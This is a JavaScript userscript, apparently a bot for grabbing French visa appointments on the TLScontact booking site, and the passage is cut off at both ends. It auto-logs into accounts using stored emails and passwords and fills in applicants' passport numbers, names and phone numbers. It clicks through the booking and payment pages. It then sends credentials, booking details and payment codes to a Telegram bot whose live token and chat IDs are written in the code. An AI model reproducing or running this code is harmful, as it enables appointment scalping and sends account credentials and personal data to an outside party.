if (document.querySelector('.tls-inquiry-form .button-neo-inside.button-bottom.-primary')) {
    console.log('The "Vérifier" button exists.');
} else {
    console.log('The "Vérifier" button does not exist.');  setTimeout(function(){  location.reload();  }, 5000);
}
 }, 15000);

var green = document.getElementsByClassName("green").length;
var red = document.getElementsByClassName("red").length;

if (green) {  document.getElementById("MOTIF").textContent = 'Payé'; document.title = 'Payé'; localStorage.setItem("SUCCESS", 1); setTimeout(function(){ window.location.href =  "https://as2.ftcdn.net/v2/jpg/01/57/10/27/1000_F_157102764_CgnuHamrGkX3NzTD0gohDjX1m3cXky4m.jpg"   }, 15e3);  }
else if (red) {  document.getElementById("MOTIF").textContent = 'réservé'; document.title = 'réservé';  localStorage.setItem("SUCCESS", 1);
              }
else {
 const intervalId = setInterval(function () {
        var element11 = document.querySelectorAll(".tls-simple-text-banner, .tls-news-banner, .tls-footer, .vld-overlay.is-active.is-full-page, .tls-simple-banner-small, .tls-status-card-info.small-card.tls-padding-bottom-no");
        if (element11) {
            GetDate();
            clearInterval(intervalId);
        }
    }, 7000);
var clickmembre = document.getElementsByClassName("button-neo-inside button-bottom -primary").length;
if (clickmembre) {         localStorage.setItem("membre"+localStorage.getItem("TLS_WEB_issuer"), clickmembre );
setTimeout(function(){ var refi = window.location.pathname.split("/")[4]; localStorage.setItem("refi"+localStorage.getItem("TLS_WEB_issuer"), refi ); document.getElementById("MOTIF").textContent = '';
  const element = document.querySelector('.tls-inquiry-body button.button-neo-inside.-primary');
  if (element) { clearInterval(personal); document.getElementById("MOTIF").textContent = 'personal';
                
                    let url = window.location.href;
let newUrl2 = url.replace("personal", "appointment");            
if (window.location.pathname.split("/")[1] === 'personal') {
//setTimeout(function(){    window.location.href = newUrl2   }, 5e3);
}
}
var script9 = document.createElement('script'); script9.src = "https://recaptcha.net/recaptcha/api.js?render=6LcTpXcfAAAAAM3VojNhyV-F1z92ADJIvcSZ39Y9"; document.head.appendChild(script9);
 },1e3); }}}}, 6000);


////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

let appointment = setInterval(() => {    if ( window.location.pathname.split("/")[1] == 'appointment' || window.location.pathname.split("/")[1] == 'personal' || window.location.pathname.split("/")[1] == 'inquiry' ) {
setTimeout(function(){     var refi = window.location.pathname.split("/")[4]; localStorage.setItem("refi"+localStorage.getItem("TLS_WEB_issuer"), refi ); document.getElementById("MOTIF").textContent = ''; //setTimeout(function(){  GetDate(); },10e3);
var script9 = document.createElement('script'); script9.src = "https://recaptcha.net/recaptcha/api.js?render=6LcTpXcfAAAAAM3VojNhyV-F1z92ADJIvcSZ39Y9"; document.head.appendChild(script9);

if ( window.location.pathname.split("/")[1] == 'appointment' ) {
        const intervalId = setInterval(function () {
        var element = document.querySelectorAll(".tls-simple-text-banner, .tls-news-banner, .tls-footer, .vld-overlay.is-active.is-full-page, .tls-simple-banner-small, .tls-status-card-info.small-card.tls-padding-bottom-no");
        if (element) {
            GetDate();
            clearInterval(intervalId);
        }
    }, 7000);
}

document.title = window.location.pathname.split("/")[3] + " " + window.location.pathname.split("/")[1]

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

var email = localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"));
var pwd = localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));
var appointmentType = localStorage.getItem("fiAppointmentType"+localStorage.getItem("TLS_WEB_issuer"));
var membre = localStorage.getItem("membre"+localStorage.getItem("TLS_WEB_issuer"));

var content = email + "\n" + pwd + "\n" + appointmentType + "\n" + "Refresh : " + MAXO / 1000 + " Sec" + "\n" + membre  ;
document.getElementById("EMAIL").textContent = content;
document.getElementById("EMAIL").style.whiteSpace = "pre-line";
document.getElementById("EMAIL").style.textAlign = "left";


clearInterval(appointment); },1e3);
}  }, 3000);

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////


let formGroup = setInterval(() => {
if ( window.location.pathname.split("/")[1] == 'formGroup' ) {
 const button = document.querySelector('button.tls-button-primary.button-neo-inside');
  if (button) {
      localStorage.setItem("cloudflare", 0);
const trElement = document.querySelector('tr.tls-table-content');
const tdElement = trElement.querySelector('td.tls-table-cell');
const membreElement = trElement.querySelector('td.tls-table-cell.tls-table-cells');
const value = tdElement.textContent.substr(1);
console.log(value);document.getElementById("MOTIF").textContent = window.location.pathname.split("/")[1] + " " + "Step :" + value ;
 clearInterval(formGroup);
/*
    if (localStorage.getItem("SUCCESS") === '0') {
        let randomNumber = Math.floor(Math.random() * 6); // Nombre entre 0 et 5
        let pageType = (randomNumber === 0) ? "appointment" : "personal"; // 1 chance sur 6 pour "appointment"
        let baseURL = "https://fr.tlscontact.com/";
        let country = window.location.pathname.split("/")[2];
        let location = window.location.pathname.split("/")[3];
        let finalURL = `${baseURL}${pageType}/${country}/${location}/${value}`;
        console.log(`Redirecting to: ${finalURL}`);
        setTimeout(function () {window.location.href = finalURL;clearInterval(formGroup);}, 2000);
    }     
    */
      
if ( localStorage.getItem("SUCCESS") === '0' ) {
setTimeout(function(){   window.location.href = "https://fr.tlscontact.com/personal/" + window.location.pathname.split("/")[2] + "/" + window.location.pathname.split("/")[3] +"/" + value ;   clearInterval(formGroup); }, 2000);
}
else if ( localStorage.getItem("SUCCESS") === '1' ) {
setTimeout(function(){   window.location.href = "https://fr.tlscontact.com/personal/" + window.location.pathname.split("/")[2] + "/" + window.location.pathname.split("/")[3] +"/" + value ;   clearInterval(formGroup); }, 2000);
}
else if ( localStorage.getItem("SUCCESS") === null ) {
setTimeout(function(){   window.location.href = "https://fr.tlscontact.com/personal/" + window.location.pathname.split("/")[2] + "/" + window.location.pathname.split("/")[3] +"/" + value ;   clearInterval(formGroup); }, 2000);
}
  }

}
}, 5000);

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

let home = setInterval(() => { if ( window.location.pathname.split("/")[4] == 'home' ) {

  if (window.location.search.includes('switch')) {

const logoutElement = document.querySelector('.tls-navbar--slot a.tls-link-uppercase');

            if (logoutElement) {
                logoutElement.click();  clearInterval(home);
            } else {
                console.error('The logout element was not found on the page.');

                //revoir
localStorage.setItem("403ERROR", 0);
  const element5 = document.querySelector('a.tls-button-link');
  if (element5) {  localStorage.removeItem('pageReloaded');
 setTimeout(function(){  element5.click(); clearInterval(home);   }, 1000);
}

            }

    }

    else {

//revoir
localStorage.setItem("403ERROR", 0);
  const element = document.querySelector('a.tls-button-link');
  if (element) {  localStorage.removeItem('pageReloaded');
 setTimeout(function(){  element.click(); clearInterval(home);   }, 1000);
}
  }
}
 }, 2000);

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

 if ( window.location.pathname.split("/")[1] == 'login-maximum' ) {
 var IDTLS = localStorage.getItem("TLS_WEB_formGroupId");
 var IDcas = localStorage.getItem("TLS_WEB_issuer");
 var IDSZ = localStorage.getItem("TLS_WEB_issuer");
    window.location.href = "https://fr.tlscontact.com/formGroup/" + localStorage.getItem("TLS_WEB_issuer").substring(0, 2) + "/" + IDcas
 }

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

 if ( window.location.pathname.split("/")[1] == 'country' ) {
    window.location.href = "https://fr.tlscontact.com/formGroup/" + window.location.pathname.split("/")[2] + "/" + window.location.pathname.split("/")[4];
 }

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

  var set = setInterval(() => {
if (window.location.pathname.split("/")[1] == 'form' || window.location.pathname.split("/")[1] == 'forms' || window.location.pathname.split("/")[1] == 'welcome') {
if (document.body.innerText.includes('Veuillez remplir votre formulaire de demande avec exactement les mêmes informations que vous avez fournies sur votre demande de visa France') ||
    document.body.innerText.includes('Si vous souhaitez voyager avec des membres de votre famille (conjoint(e), parents, enfants), il est obligatoire d’inscrire chaque membre dans le même groupe. Cette règle s’applique également aux personnes souhaitant voyager ensemble mais n’ayant aucun lien de parenté.') ||
   document.body.innerText.includes('') || window.location.pathname.split("/")[1] == 'welcome') {
    clearInterval(set);
var emailX = localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"));
var pwdX = localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));
var member = localStorage.getItem("membre"+localStorage.getItem("TLS_WEB_issuer"));
var content = emailX + "\n" + pwdX + "\n" + member;

document.getElementById("EMAIL").textContent = content;
document.getElementById("EMAIL").style.whiteSpace = "pre-line";
document.getElementById("EMAIL").style.textAlign = "left";

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

 function applyCodeToSubmit() {

const rawData = localStorage.getItem('DATA' + localStorage.getItem('TLS_WEB_issuer'));
if (!rawData) {
    console.error('No data found in localStorage for key "".');
} else {
    console.log('Data retrieved from localStorage:', rawData);

    // Parse the raw data into an object
    const data = rawData.split('|').reduce((acc, pair) => {
        const [key, value] = pair.split(':').map(str => str.trim());
        acc[key] = value;
        return acc;
    }, {});

    console.log('Parsed data:', data);

// Mapping English to French travel purposes
const travelPurposeMapping = {
    "medical_care": "Soins médicaux",
    "family_friend_family_visit_primo": "Visite familiale - Première demande",
    "family_friend_family_visit_vise": "Visite familiale - Renouvellement d'un visa ordinaire visé",
    "tourism_private_visit_primo": "Tourisme / Visite privée - Première demande",
    "tourism_private_visit_vise": "Tourisme / Visite privée - Renouvellement d'un visa ordinaire visé",
    "family_friend_family_visit_child_foreign_parent_french_nat_spouse": "Visite familiale / enfant ou parent étranger de Français ou de son conjoint"
};

    const travelPurposeEnglish = data['f_trav_purpose']; // Adjust the key if necessary
    const travelPurposeFrench = travelPurposeMapping[travelPurposeEnglish]; // Map to French
    console.log(`Mapped travel purpose: ${travelPurposeFrench}`);

    if (travelPurposeFrench) {
        // Find all "children_item" elements
        const childrenItems = document.querySelectorAll('.children_item');

        let selected = false;

        // Normalize text for matching
        const normalizeText = (text) => text.replace(/\s+/g, ' ').trim();

        // Iterate over the children to find a match
        childrenItems.forEach(item => {
            const itemText = normalizeText(item.textContent);

            if (itemText === normalizeText(travelPurposeFrench)) {
                // Simulate a click to select the correct child item
                item.click();
                selected = true;

                console.log(`Travel purpose "${travelPurposeFrench}" selected successfully.`);
            }
        });

        if (!selected) {
            console.warn(`Travel purpose "${travelPurposeFrench}" not found in the nested options.`);
        }
    } else {
        console.warn(`Travel purpose "${travelPurposeEnglish}" not mapped to any French option.`);
    }

    // Fill text fields
    const fields = [
        { id: 'f_cai', key: 'f_cai' }, // Reference Number
        { id: 'f_pers_surnames', key: 'f_pers_surnames' }, // Surname
        { id: 'f_pers_givennames', key: 'f_pers_givennames' }, // Given Names
        { id: 'f_pass_num', key: 'f_pass_num' }, // Passport Number
        { id: 'f_pers_mobile_phone', key: 'f_pers_mobile_phone' }, // Mobile Phone
        { id: 'f_pers_nationality', key: 'f_pers_nationality' }, // Nationality
    ];

    fields.forEach(({ id, key }) => {
        const field = document.getElementById(id);
        if (field && data[key]) {
            field.value = data[key];
            field.dispatchEvent(new Event('input', { bubbles: true }));
            console.log(`Field "${id}" filled with value "${data[key]}".`);
        } else {
            console.warn(`Field "${id}" or data key "${key}" not found.`);
        }
    });

    // Fill dropdown fields
    const dropdowns = [
        { id: 'passport-type', key: 'f_identity_type' }, // Passport Type
    ];

    dropdowns.forEach(({ id, key }) => {
        const selectElement = document.getElementById(id);
        if (selectElement && data[key]) {
            selectElement.value = data[key];
            selectElement.dispatchEvent(new Event('change', { bubbles: true }));
            console.log(`Dropdown "${id}" set to "${data[key]}".`);
        } else {
            console.warn(`Dropdown "${id}" or data key "${key}" not found.`);
        }
    });

    // Utility function to handle radio buttons
    function clickRadioButton(name, value) {
        const radioButton = document.querySelector(`input[name="${name}"][value="${value}"]`);
        if (radioButton) {
            radioButton.click();
            radioButton.dispatchEvent(new Event('input', { bubbles: true }));
            radioButton.dispatchEvent(new Event('change', { bubbles: true }));
            console.log(`Radio button "${name}" with value "${value}" clicked successfully.`);
        } else {
            console.error(`Radio button "${name}" with value "${value}" not found.`);
        }
    }

    // Handle radio buttons
    const radios = [
        { name: 'f_trav_go_to_domtom', key: 'f_trav_go_to_domtom', defaultValue: 'f' }, // Go to DOM-TOM
        { name: 'fi_fingerprints_collected', key: 'fi_fingerprints_collected', defaultValue: 'f' }, // Fingerprints collected
        { name: 'fi_first_schengen_trip', key: 'fi_first_schengen_trip', defaultValue: 'f' }, // First Schengen trip
    ];

    radios.forEach(({ name, key, defaultValue }) => {
        const value = data[key] === 'true' ? 't' : (data[key] === 'false' ? 'f' : defaultValue);
        clickRadioButton(name, value);
    });

    console.log('Form filled successfully.');
}

setTimeout(function(){
const rawData2 = localStorage.getItem('DATA' + localStorage.getItem('TLS_WEB_issuer'));
if (!rawData2) {
    console.error('No data found in localStorage for key "DATA"' + localStorage.getItem('TLS_WEB_issuer') + '.');
} else {
    console.log('Data retrieved from localStorage:', rawData2);
    const data = rawData2.split('|').reduce((acc, pair) => {
        const [key, value] = pair.split(':').map(str => str.trim());
        acc[key] = value;
        return acc;
    }, {});

    console.log('Parsed data:', data);
    function convertToDateFormat(dateString) {
        const date = new Date(dateString);
        if (!isNaN(date.getTime())) {
            return date.toISOString().split('T')[0];
        } else {
            console.error(`Invalid date format: "${dateString}".`);
            return '';
        }
    }
    const birthDateField = document.getElementById('f_pers_birth_date');
    if (birthDateField && data['f_pers_birth_date']) {
        const formattedDate = convertToDateFormat(data['f_pers_birth_date']);
        if (formattedDate) {
            birthDateField.setAttribute('value', formattedDate);
            birthDateField.value = formattedDate;
            birthDateField.dispatchEvent(new Event('input', { bubbles: true }));
            birthDateField.dispatchEvent(new Event('change', { bubbles: true }));
            console.log(`Field "f_pers_birth_date" filled with value "${formattedDate}".`);
        } else {
            console.warn(`Invalid date format for "f_pers_birth_date": ${data['f_pers_birth_date']}`);
        }
    } else {
        console.warn('Field "f_pers_birth_date" or its data not found.');
    }
}
function getFutureDate(daysToAdd) {
    const today = new Date();
    today.setDate(today.getDate() + daysToAdd);
    return today.toISOString().split('T')[0];
}
const departureDateField = document.getElementById('fi_trav_origin_departure_date');
if (departureDateField) {
    const futureDate = getFutureDate(20);
    departureDateField.setAttribute('value', futureDate);
    departureDateField.value = futureDate;
    departureDateField.dispatchEvent(new Event('input', { bubbles: true }));
    departureDateField.dispatchEvent(new Event('change', { bubbles: true }));
    console.log(`Field "fi_trav_origin_departure_date" filled with value "${futureDate}".`);
} else {
    console.warn('Field "fi_trav_origin_departure_date" not found.');
}
}, 3000);

}

if (window.location.href.includes("edit")) {
    const urlParts = window.location.pathname.split('/');
    const buttonName = urlParts[4]; // Extract "maRBA2fr" based on the URL structure
    const dynamicButton = document.createElement("button");
    dynamicButton.id = "staticButton"; // Static ID for the button
    dynamicButton.textContent = buttonName; // Set the button name dynamically
    dynamicButton.style.position = "fixed";
    dynamicButton.style.top = "10px";
    dynamicButton.style.left = "10px"; // Place it on the left side
    dynamicButton.style.zIndex = "10000";
    dynamicButton.style.padding = "10px 20px";
    dynamicButton.style.fontSize = "16px";
    dynamicButton.style.fontWeight = "bold";
    dynamicButton.style.color = "#FFF";
    dynamicButton.style.backgroundColor = "#007BFF";
    dynamicButton.style.border = "none";
    dynamicButton.style.borderRadius = "5px";
    dynamicButton.style.cursor = "pointer";
    dynamicButton.style.boxShadow = "0 4px 6px rgba(0, 0, 0, 0.1)";

    // Add an action to the button
    dynamicButton.onclick = () => {
alert(`Button "${buttonName}" clicked!`);
applyCodeToSubmit();
    };
    document.body.appendChild(dynamicButton);
}

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////


setTimeout(() => {
errormessage = "⚠️⚠️⚠️⚠️⚠️⚠️ Formulaire_OFF" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));
modal();
}, 1000);
}
}
}, 9000);


////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////


if (window.location.href == 'https://visas-fr.tlscontact.com/') {
    setTimeout(function(){
window.location.href = "https://fr.tlscontact.com/not-found";
}, 1000);
    }

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

if ( window.location.pathname.split("/")[1] == 'personal' , "appointment" ) {

    localStorage.setItem("juridictions", window.location.pathname.split("/")[3] );
var auto_refresh = setInterval(function (){
var elements = document.querySelectorAll(".tls-simple-text-banner, .tls-news-banner, .tls-footer, .vld-overlay.is-active.is-full-page, .tls-simple-banner-small, .tls-status-card-info.small-card.tls-padding-bottom-no");
if (elements.length > 0) {
elements[0].parentNode.removeChild(elements[0]);
}
const newElement = Object.assign(document.createElement('div'), {
    style: "position:fixed;z-index:20000;top:40px;left:0;background:#000;color:#FFF;padding:10px;font-size:16px;font-family:Arial,Helvetica,sans-serif;text-align:center",
    textContent: "",
    id: "MOTIFO"
});
if ( document.querySelectorAll('.tls-popup').length > 0 ) {  document.querySelector('.tls-button-primary.-uppercase').click(); clearInterval(auto_refresh);   }

 }, 1000);
}

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////



if ( window.location.pathname.split("/")[1] == 'auth' ) {
localStorage.removeItem('pageReloaded');
localStorage.setItem("403ERROR", 0);
    function Real() {
  document.getElementById('username').value = localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"));
  document.getElementById('password').value = localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));
  document.getElementById('password').scrollIntoView({behavior: "smooth", block: "center", inline: "nearest"});
setTimeout(function() {
  document.querySelector("#kc-login").click();
}, 2000);
document.querySelector("#kc-login").on("click", function() {
});
}
 if((document.body.innerText).indexOf('Invalid username or password.') > -1){ setTimeout(function(){ document.body.style.backgroundColor = "#FFA500"; /* window.location.href = "https://fr.tlscontact.com/application-fees/ma/maCAS2fr";*/ }, 2000);


setTimeout(() => {
 errormessage = "⚠️ Invalid username or password. ⚠️" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));
modal();
}, 1000);}
    else
 if((document.body.innerText).indexOf("Nom d'utilisateur ou mot de passe invalide.") > -1){
     setTimeout(() => {
 errormessage = "⚠️ Invalid username or password. ⚠️" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));
modal();
}, 1000);  setTimeout(function(){ document.body.style.backgroundColor = "#FFA500"; }, 2000); }
else  {
    setTimeout(function(){ Real(); }, 1000);
}

}


if ( window.location.pathname.split("/")[1] == 'login' ) {
  const issuer = localStorage.getItem("TLS_WEB_issuer");
const firstTwoChars = issuer.substring(0, 2);
console.log(firstTwoChars); // Output: "dz" or "ma"
if ( refer ) {  setTimeout(function(){    window.location.href = "https://fr.tlscontact.com/personal/"+firstTwoChars+"/"+issuer+"/"+refer }, 15000);  }
    else {
setTimeout(function(){    window.location.href = "https://fr.tlscontact.com/formGroup/"+firstTwoChars+"/"+issuer}, 15000); }
 }


if (window.location.pathname.split("/")[4] == 'undefined' ) {
setTimeout(function(){    window.location.href = "https://fr.tlscontact.com/formGroup/"+window.location.pathname.split("/")[2]+"/"+window.location.pathname.split("/")[3]}, 5000);
}

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////


const intervalIdhome = setInterval(() => {
if ( window.location.href == "https://fr.tlscontact.com/visa/"+window.location.pathname.split("/")[2]) {
setTimeout(function(){
    document.querySelector(`a[href="/visa/${pays}/${juridiction}/home"]`).click();
    clearInterval(intervalIdhome); }, 2000);
  }
}, 2000);

////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

const intervalIdBut = setInterval(() => {
  const removedButtons = document.querySelectorAll('button#save.tls-button-link');
  if (removedButtons.length > 0) {
    clearInterval(intervalIdBut);
    const randomIndex = Math.floor(Math.random() * removedButtons.length);
    const randomButton = removedButtons[randomIndex];
    console.log(randomButton);
    randomButton.click();
  }
}, 100);   // Validator

}}
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

function checkCheckout() {
if ( window.location.href.split("/")[3] == "checkout") {
var numberElement = document.querySelector('.tls-summary-sublist-item--number');
var text = numberElement.textContent.trim();
var number = parseInt(text.match(/\d+/)[0]);
console.log(number); // outputs 1

var dateElement = document.querySelector(".tls-checkout--info .tls-simple-text strong u");
var dateTimeString = dateElement.textContent.trim();
var emailloc = localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"));
var pwdloc = localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));
document.title = "je suis la ";
function execute() {

  const call = "⚫ Success : " + pwdloc + "\n⚫ Email : " + emailloc + "\n⚫ Center : " + window.location.pathname.split("/")[3] + "\n⚫ DEMANDEUR(S) : " + number  + "\n⚫ " + dateTimeString + "\n" + "\n⚫ MOTIF : " + localStorage.getItem("f_trav_purpose"+localStorage.getItem("TLS_WEB_issuer")) ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST', `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onload = function() {
    if (xhr.status === 200) { clearInterval(checkoutInterval);
        document.getElementById("MOTIF").textContent = "Appointement has been sent Successfuly";
    } else {
      // error, retry
      execute();
    }
  };
  xhr.onerror = function() {
    // error, retry
    execute();
  };
  xhr.send(`chat_id=-1001732653163&text=${call}&parse_mode=html`);
};
execute();
}
};


////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////
////////// X/X/X/ /////////////                     ////////// X/X/X/ /////////////                ////////// X/X/X/ /////////////

let checky = setInterval(() => {
  if (window.location.pathname.split("/")[1] == 'checkout'  && window.location.pathname.split("/")[2] == 'ma' && window.location.pathname.split("/")[2] !== 'confirm') {
   setTimeout(function(){ if (window.location.pathname.split("/")[1] == 'checkout'  && window.location.pathname.split("/")[2] == 'ma' && window.location.pathname.split("/")[2] !== 'confirm') { location.reload(); document.body.style.backgroundColor = "#FFA500"; } }, 66e3);
    var uppercase = document.getElementsByClassName("tls-button-primary -uppercase")[0];
    document.title = "Appointement has been sent Successfuly";
          localStorage.setItem("SUCCESS", 1);
    if (uppercase) {
      uppercase.click();
      clearInterval(checky);
    }
  }
}, 9000);

let checkA = setInterval(() => {
  if (window.location.pathname.split("/")[1] == 'checkout' && window.location.pathname.split("/")[2] == 'confirm') {
    setTimeout(function(){ if (window.location.pathname.split("/")[1] == 'checkout' && window.location.pathname.split("/")[2] == 'confirm') { location.reload(); document.body.style.backgroundColor = "#FFA500"; } }, 66e3);
    var uppercaseA = document.getElementsByClassName("button-neo-outer -primary")[0];
    document.title = "Appointement has been sent Successfuly";
          localStorage.setItem("SUCCESS", 1);
    if (uppercaseA) {
      uppercaseA.click();
      clearInterval(checkA);
    }
  }
}, 9000);

let checke = setInterval(() => {
  if (window.location.pathname.split("/")[1] == 'checkout' && window.location.host == 'payment.visas-fr.tlscontact.com' ) { localStorage.setItem("SUCCESS", 0);
setTimeout(function(){  if (window.location.pathname.split("/")[1] == 'checkout' && window.location.host == 'payment.visas-fr.tlscontact.com' ) { location.reload(); document.body.style.backgroundColor = "#FFA500"; } }, 66e3);
const paymentOption = document.querySelector('.check-payment-circle.bi.bi-circle');
        localStorage.setItem("SUCCESS", 0);

if (paymentOption) {
paymentOption.click();
clearInterval(checke);
}
setTimeout(() => {
  const element = document.querySelector('.btn.btn-primary.btn-confirm');
  if (element) {
    element.click();
  }
}, 5000);
    }
}, 9000);

if (window.location.pathname.split("/")[1] == 'binga' ) {

var email = localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"));
var pwd = localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));

var content = email + "\n" + pwd;
document.getElementById("EMAIL").textContent = content;
document.getElementById("EMAIL").style.whiteSpace = "pre-line";
document.getElementById("EMAIL").style.textAlign = "left";

    
setTimeout(() => {

const payContent = document.querySelector('.pay_content');
const payStatus = payContent.querySelector('.pay_status');
const code = payStatus.childNodes[3].textContent.trim();
console.log(code);

if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Casa2000@' ) {

  const call = "⚫⚫⚫⚫⚫⚫" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n WafaCash : " + code  ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001955074728', text: call, parse_mode: 'html'}));
                         }
else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Mohamed@33@' ) {
  const call = "⚫⚫⚫⚫⚫⚫" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n WafaCash : " + code  ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001880026679', text: call, parse_mode: 'html'}));
}
else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Visa2022@'  || localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Visa2024@'  ) {
  const call = "⚫⚫⚫⚫⚫⚫" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n WafaCash : " + code  ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1001925051993', text: call, parse_mode: 'html'}));
}
else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Oujda123456789*' ) {
  const call = "⚫⚫⚫⚫⚫⚫" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n WafaCash : " + code  ;
  const xhr = new XMLHttpRequest();
  xhr.open('POST',  `https://api.telegram.org/bot${'5108275835:AAG9KGnrGLPx4l5JQOcFhsqjnlO31m0d_0M'}/sendMessage`);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({chat_id: '-1002101071692', text: call, parse_mode: 'html'}));
}
else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) === 'Khalid@33@' ) {
  const call = "⚫⚫⚫⚫⚫⚫" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n WafaCash : " + code  ;
  const xhr = new XMLHttpRequest();
